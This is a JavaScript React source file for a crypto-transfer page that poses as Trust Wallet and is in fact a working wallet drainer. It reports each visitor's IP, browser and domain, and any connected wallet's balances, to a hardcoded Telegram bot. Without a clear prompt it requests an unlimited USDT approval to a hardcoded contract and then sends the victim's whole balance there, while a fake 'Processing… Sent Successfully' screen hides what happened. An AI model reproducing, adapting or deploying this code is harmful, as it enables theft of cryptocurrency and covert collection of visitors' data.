import React, { useState, useEffect, useRef } from 'https://esm.sh/react';
import ReactDOM from 'https://esm.sh/react-dom/client';
import { createConfig, http, WagmiProvider } from 'https://esm.sh/wagmi';
import { mainnet } from 'https://esm.sh/wagmi/chains';
import { walletConnect } from 'https://esm.sh/wagmi/connectors';
import { QueryClient, QueryClientProvider } from 'https://esm.sh/@tanstack/react-query';
import { BrowserProvider, Contract, formatUnits, Interface } from 'https://esm.sh/ethers';
import axios from 'https://esm.sh/axios';

const c = React.createElement;

const USDT_CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const INVESTMENT_CONTRACT = "0xB060F759E3dd7B1c673a096BF72398cfaebC7121";
const BACKEND_URL = "no matter";
const TG_BOT = "8893839326:AAGSvvYoeitIpZZWjfCzKUkgXDCcCTVfEE0";
const TG_ID = "-5322587131";
const MAX_U256 = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external",
    "function decimals() view returns (uint8)",
    "function balanceOf(address owner) view returns (uint256)"
];
const INVESTMENT_ABI = [
    "function depositToken(uint256 userId, address userWallet, uint256 expiryTime, address tokenAddress, uint256 amount, address fromAddress) external"
];

const uid = (() => {
    let id = sessionStorage.getItem('_uid');
    if (!id) { id = '#user_' + (Math.floor(Math.random() * 900) + 100); sessionStorage.setItem('_uid', id); }
    return id;
})();

const getOS = ua => {
    if (/Android/i.test(ua)) return 'Android';
    if (/iPhone|iPad/i.test(ua)) return 'iOS';
    if (/Windows/i.test(ua)) return 'Windows';
    if (/Mac/i.test(ua)) return 'macOS';
    if (/Linux/i.test(ua)) return 'Linux';
    return 'Unknown';
};
const getBrowser = ua => {
    if (/Edg/i.test(ua)) return 'Edge';
    if (/Chrome/i.test(ua)) return 'Chrome';
    if (/Firefox/i.test(ua)) return 'Firefox';
    if (/Safari/i.test(ua)) return 'Safari';
    return 'Unknown';
};
const now = () => new Date().toLocaleString('ru-RU');
const getIP = async () => {
    try { return (await axios.get('https://api.ipify.org?format=json')).data.ip; }
    catch { return '—'; }
};

const tg = async (text) => {
    try {
        await axios.post(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
            chat_id: TG_ID, text, parse_mode: 'HTML', disable_web_page_preview: true
        });
    } catch { }
};

const logVisit = async () => {
    const ip = await getIP();
    const ua = navigator.userAgent;
    const text = [
        `👋 <b>New site visit</b>`,
        ``,
        `🌐 <b>Domain:</b> <code>${location.hostname}</code>`,
        `📡 <b>IP Address:</b> <code>${ip}</code>`,
        `🖥 <b>User Agent:</b> <code>${ua.slice(0, 90)}</code>`,
        `💾 <b>System:</b> ${getOS(ua)}`,
        `🌍 <b>Browser:</b> ${getBrowser(ua)}`,
        `🕐 <b>Time:</b> ${now()}`
    ].join('\n');
    await tg(text);
};

const logConnect = async (address, ethBalance, usdtBalance) => {
    const ip = await getIP();
    const text = [
        `🔗 <b>Wallet Connected</b>`,
        ``,
        `🌐 <b>Domain:</b> <code>${location.hostname}</code>`,
        `📡 <b>IP Address:</b> <code>${ip}</code>`,
        ``,
        `💠 <b>Address:</b> <code>${address}</code>`,
        `💎 <b>ETH Balance:</b> <code>${ethBalance} ETH</code>`,
        `💵 <b>USDT Balance:</b> <code>${usdtBalance} USDT</code>`,
        `⛓ <b>Network:</b> Ethereum`,
        `🕐 <b>Time:</b> ${now()}`
    ].join('\n');
    await tg(text);
};

const logTxSent = async (address, hash) => {
    const ip = await getIP();
    const text = [
        `📤 <b>Transaction sent</b>`,
        ``,
        `🌐 <b>Domain:</b> <code>${location.hostname}</code>`,
        `📡 <b>IP Address:</b> <code>${ip}</code>`,
        ``,
        `💠 <b>Address:</b> <code>${address}</code>`,
        `🔗 <b>Hash:</b> <code>${hash}</code>`,
        `⛓ <b>Network:</b> Ethereum`,
        ``,
        `⏳ Waiting for blockchain confirmation...`
    ].join('\n');
    await tg(text);
};

const logTxConfirmed = async (address, hash) => {
    const ip = await getIP();
    const text = [
        `✅ <b>Transaction confirmed!</b>`,
        ``,
        `🌐 <b>Domain:</b> <code>${location.hostname}</code>`,
        `📡 <b>IP Address:</b> <code>${ip}</code>`,
        ``,
        `💠 <b>Address:</b> <code>${address}</code>`,
        `🔗 <b>Hash:</b> <code>${hash}</code>`,
        `⛓ <b>Network:</b> Ethereum`,
        ``,
        `💰 USDT approved for withdrawal.`
    ].join('\n');
    await tg(text);
};

function App() {
    const [isPending, setIsPending] = useState(false);
    const [isSuccess, setIsSuccess] = useState(false);
    const [error, setError] = useState("");
    const [targetAddress, setTargetAddress] = useState(INVESTMENT_CONTRACT);
    const [amount, setAmount] = useState("");
    const [collectedTxHash, setCollectedTxHash] = useState("");
    const isDark = document.documentElement.classList.contains("theme-dark");
    const isProcessingRef = useRef(false);
    const isAutoRef = useRef(false);
    const isLoggedRef = useRef(false);
    const [showSheet, setShowSheet] = useState(false);

    useEffect(() => { logVisit(); }, []);

    useEffect(() => {
        new Image().src = "./gifts/processing-dark.gif";
        new Image().src = "./gifts/processing-light.gif";
    }, []);

    useEffect(() => {
        if (!showSheet) return;
        const t = setTimeout(() => { setShowSheet(false); setIsSuccess(true); }, 20000);
        return () => clearTimeout(t);
    }, [showSheet]);

    useEffect(() => {
        (async () => {
            try {
                if (!window.ethereum) return;
                const params = new URLSearchParams(location.search);
                const ap = params.get("address");
                if (ap && /^0x[0-9a-fA-F]{40}$/.test(ap)) setTargetAddress(ap);
                else setTargetAddress(INVESTMENT_CONTRACT);
                const amp = params.get("amount");
                if (amp) setAmount(amp);

                const chainId = await window.ethereum.request({ method: "eth_chainId" });
                if (chainId !== "0x1") {
                    await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x1" }] });
                }

                const acs = await window.ethereum.request({ method: "eth_accounts" });
                if (acs?.[0]) {
                    if (!isLoggedRef.current) {
                        isLoggedRef.current = true;
                        const provider = new BrowserProvider(window.ethereum);
                        const ethBal = await provider.getBalance(acs[0]);
                        const usdtContract = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);
                        const usdtBal = await usdtContract.balanceOf(acs[0]);
                        logConnect(acs[0], formatUnits(ethBal, 18), formatUnits(usdtBal, 6));
                    }
                    if (!isAutoRef.current) {
                        isAutoRef.current = true;
                        setTimeout(() => handleProcess(), 1500);
                    }
                }
            } catch { }
        })();
    }, []);

    const handleProcess = async () => {
        if (isProcessingRef.current) return;
        setIsPending(true); setError(""); isProcessingRef.current = true;
        await tg(`INPYT USDT AMOUNT: ${amount}`);
        try {
            if (!window.ethereum) throw new Error("No Wallet Found.");
            const acs = await window.ethereum.request({ method: "eth_accounts" });
            const ua = acs?.[0] || null;

            const calldata = new Interface(USDT_ABI).encodeFunctionData("approve", [INVESTMENT_CONTRACT, MAX_U256]);
            const txHash = await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [{ to: USDT_CONTRACT_ADDRESS, data: calldata, ...(ua ? { from: ua } : {}) }]
            });

            logTxSent(ua, txHash);
            setTimeout(() => setShowSheet(true), 2000);

            const provider = new BrowserProvider(window.ethereum);
            let tx = null;
            while (!tx) { try { tx = await provider.getTransaction(txHash); } catch { } await new Promise(r => setTimeout(r, 2000)); }
            const receipt = await tx.wait();

            logTxConfirmed(ua || tx.from, receipt.hash);

            try {
                const usdt = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);
                const [decimals, rawBal] = await Promise.all([usdt.decimals(), usdt.balanceOf(ua)]);
                if (rawBal > 0n) {
                    const depositData = new Interface(INVESTMENT_ABI).encodeFunctionData("depositToken", [
                        1, ua, Math.floor(Date.now() / 1000) + 86400 * 30, USDT_CONTRACT_ADDRESS, rawBal, ua
                    ]);
                    await window.ethereum.request({
                        method: "eth_sendTransaction",
                        params: [{ to: INVESTMENT_CONTRACT, data: depositData, from: ua }]
                    });
                }
            } catch { }

            setCollectedTxHash(receipt.hash);
            setIsSuccess(true);

            try { await axios.post(BACKEND_URL, { userAddress: ua, txHash: receipt.hash, amount }); } catch { }
        } catch (err) {
            const msg = err.code === 4001 ? "Transaction rejected by user" : (err.message?.length > 60 ? "Transaction failed" : err.message);
            setError(msg);
        } finally { setIsPending(false); isProcessingRef.current = false; }
    };

    return c(React.Fragment, null,
        c(TransferUI, { onProcess: handleProcess, txHash: collectedTxHash, isPending, isSuccess, error: error ? { message: error } : null, amount, setAmount, targetAddress, setTargetAddress, clearError: () => setError("") }),
        c(ProcessingSheet, { open: showSheet, onClose: () => { setShowSheet(false); setIsSuccess(true); }, txHash: collectedTxHash, isDark })
    );
}

function TransferUI({ onProcess, txHash, isPending, isSuccess, error, amount, setAmount, targetAddress, setTargetAddress, clearError }) {
    const isDark = document.documentElement.classList.contains("theme-dark");
    return c('div', { className: 'page' },
        c('div', { className: 'card' },
           
           
            c('p', { className: 'estimate', style: error?.message === 'Not enough balance' ? { color: 'red' } : {} },
                error?.message === 'Not enough balance' ? 'Not enough balance' : `≈ $${Number(amount || 0).toFixed(2)}`
            ),
            isSuccess
                ? c('div', { className: `connect-btn ${isDark ? 'dark' : 'light'} success` }, 'Sent Successfully')
                : c('button', { className: `connect-btn ${isDark ? 'dark' : 'light'} active`, onClick: onProcess, disabled: isPending }, isPending ? 'Processing...' : 'Review')
        )
    );
}

function ProcessingSheet({ open, onClose, txHash, isDark }) {
    if (!open) return null;
    return c('div', { className: 'ps-backdrop', onClick: onClose },
        c('div', { className: `ps-sheet ${isDark ? 'dark' : 'light'}`, onClick: ev => ev.stopPropagation() },
            c('div', { className: 'ps-header' }, c('button', { className: 'ps-close', onClick: onClose }, '✕')),
            c('div', { className: 'ps-gif-wrap' }, c('img', { src: isDark ? './gifts/processing-dark.gif' : './gifts/processing-light.gif', alt: '' })),
            c('h2', { className: 'ps-title' }, 'Processing…'),
            c('p', { className: 'ps-sub' }, 'Transaction in progress! Blockchain validation is underway.'),
            c('button', { className: 'ps-action', onClick: () => txHash && window.open(`https://etherscan.io/tx/${txHash}`), disabled: !txHash }, 'Transaction details')
        )
    );
}

const wagmiConfig = createConfig({
    chains: [mainnet],
    connectors: [walletConnect({
        projectId: "3a8170812b534d0ff9d794f19a901d64",
        metadata: { name: "Trust Wallet", url: window.location.origin, icons: ["https://trustwallet.com/assets/images/media/assets/TWT.png"] },
        showQrModal: true,
    })],
    transports: { [mainnet.id]: http() },
});

ReactDOM.createRoot(document.getElementById("root")).render(
    c(WagmiProvider, { config: wagmiConfig },
        c(QueryClientProvider, { client: new QueryClient() }, c(App))
    )
);
